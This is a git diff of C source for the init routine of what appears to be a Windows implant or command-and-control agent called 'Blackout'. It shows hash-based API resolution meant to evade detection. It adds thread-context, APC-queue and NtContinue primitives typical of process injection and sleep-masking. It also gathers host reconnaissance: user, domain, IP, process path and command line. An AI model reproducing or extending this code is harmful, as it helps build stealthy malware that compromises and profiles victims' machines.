@@ -18,15 +18,14 @@ FUNC VOID BlackoutInit() {
     Instance()->Modules.Kernel32   = LdrModuleAddr( H_MODULE_KERNEL32 );
     Instance()->Modules.Ntdll      = LdrModuleAddr( H_MODULE_NTDLL );
 
-
     Instance()->Win32.LoadLibraryA   = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "LoadLibraryA" ) );
     Instance()->Modules.Winhttp      = Instance()->Win32.LoadLibraryA( "Winhttp.dll"  );
     Instance()->Modules.Advapi32     = Instance()->Win32.LoadLibraryA( "Advapi32.dll" );
     Instance()->Modules.Msvcrt       = Instance()->Win32.LoadLibraryA( "Msvcrt.dll"   );
+    Instance()->Modules.Cryptbase    = Instance()->Win32.LoadLibraryA( "Cryptbase.dll" );
     Instance()->Win32.GetProcAddress = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetProcAddress" ) );
     Instance()->Win32.printf         = Instance()->Win32.GetProcAddress( Instance()->Modules.Msvcrt, "printf" );
-    Instance()->Win32.printf("A");
-    Instance()->Modules.Iphlpapi    = Instance()->Win32.LoadLibraryA( "Iphlpapi.dll" );
+    Instance()->Modules.Iphlpapi     = Instance()->Win32.LoadLibraryA( "Iphlpapi.dll" );
 
     Instance()->Win32.GetModuleHandleA          = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "GetModuleHandleA" ) );
     Instance()->Win32.CreateTimerQueueTimer     = LdrFuncAddr( Instance()->Modules.Kernel32, HASH_STR( "CreateTimerQueueTimer" ) );
@@ -77,6 +76,16 @@ FUNC VOID BlackoutInit() {
     Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
     Instance()->Win32.LdrLoadDll                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrLoadDll" ) );
     Instance()->Win32.NtQuerySystemInformation  = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQuerySystemInformation" ) );
+    Instance()->Win32.NtAlertResumeThread       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtAlertResumeThread" ) );
+    Instance()->Win32.NtContinue                = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtContinue" ) );
+    Instance()->Win32.NtCreateEvent             = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateEvent" ) );
+    Instance()->Win32.NtCreateThreadEx          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateThreadEx" ) );
+    Instance()->Win32.NtQueueApcThread          = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtQueueApcThread" ) );
+    Instance()->Win32.NtGetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtGetContextThread" ) );
+    Instance()->Win32.NtSetContextThread        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSetContextThread" ) );
+    Instance()->Win32.NtTestAlert               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtTestAlert" ) );
+    Instance()->Win32.NtWaitForSingleObject     = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtWaitForSingleObject" ) );
+    Instance()->Win32.NtSignalAndWaitForSingleObject = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtSignalAndWaitForSingleObject" ) );
 
     Instance()->Win32.GetUserNameA     = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "GetUserNameA" ) );
     Instance()->Win32.OpenProcessToken = LdrFuncAddr( Instance()->Modules.Advapi32, HASH_STR( "OpenProcessToken" ) );
@@ -100,24 +109,19 @@ FUNC VOID BlackoutInit() {
     Instance()->Config.Session.Heap       = Instance()->Teb->ProcessEnvironmentBlock->ProcessHeap;
     Instance()->Config.Session.ProcessId  = CST_U32( Instance()->Teb->ClientId.UniqueProcess );
     Instance()->Config.Session.ThreadId   = CST_U32( Instance()->Teb->ClientId.UniqueThread );
-    
-    Instance()->Win32.printf("B");
-    
-    GetProcessInfo( &Instance()->Config.Session.ProcessFullPath, &Instance()->Config.Session.ProcessName, &Instance()->Config.Session.ProcessCmdLine );
-    Instance()->Win32.printf("C");
+        
+    GetProcessInfo( 
+        &Instance()->Config.Session.ProcessFullPath, 
+        &Instance()->Config.Session.ProcessName, 
+        &Instance()->Config.Session.ProcessCmdLine 
+    );
 
     GetComputerInfo( 
-        &Instance()->Config.CompData.ComputerName, 
-        &Instance()->Config.CompData.DomainName, 
-        &Instance()->Config.CompData.NetBios, 
-        &Instance()->Config.CompData.UserName,
         &Instance()->Config.CompData.OsArch,
         &Instance()->Config.CompData.ProcessorType,
         &Instance()->Config.CompData.ProductType,
         &Instance()->Config.CompData.IpAddress
     );
-
-    Instance()->Win32.printf("\tzzzz\n");
 
     Instance()->Config.CompData.OsMajorV        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
     Instance()->Config.CompData.OsMinorv        = Instance()->Teb->ProcessEnvironmentBlock->OSMajorVersion;
@@ -149,9 +153,12 @@ FUNC VOID BlackoutInit() {
         "\t=> Domain Name: %s\n"
         "\t=> Ip Adress: %s\n"
         "\t=> User Name: %s\n"
-        "\t=> Process name: %x\n"
-        "\t=> Process full path: %x\n"
-        "\t=> Process CmdLine: %x\n",
+        "\t=> Process architecture: %d\n"
+        "\t=> Product Type: %d\n"
+        "\t=> Processor type: %d\n"
+        "\t=> Process name: %ws\n"
+        "\t=> Process full path: %ws\n"
+        "\t=> Process CmdLine: %ws\n",
         Instance()->Base.Buffer,
         Instance()->Base.Length,
         Instance()->Config.Session.Heap, 
@@ -164,8 +171,11 @@ FUNC VOID BlackoutInit() {
         Instance()->Config.CompData.DomainName,
         Instance()->Config.CompData.IpAddress,
         Instance()->Config.CompData.UserName,
+        Instance()->Config.CompData.OsArch,
+        Instance()->Config.CompData.ProductType,
+        Instance()->Config.CompData.ProcessorType,
         Instance()->Config.Session.ProcessName,
-        Instance()->Config.Session.ProcessFullPath
-        //Instance()->Config.Session.ProcessArch
+        Instance()->Config.Session.ProcessFullPath,
+        Instance()->Config.Session.ProcessCmdLine
     );           
 }
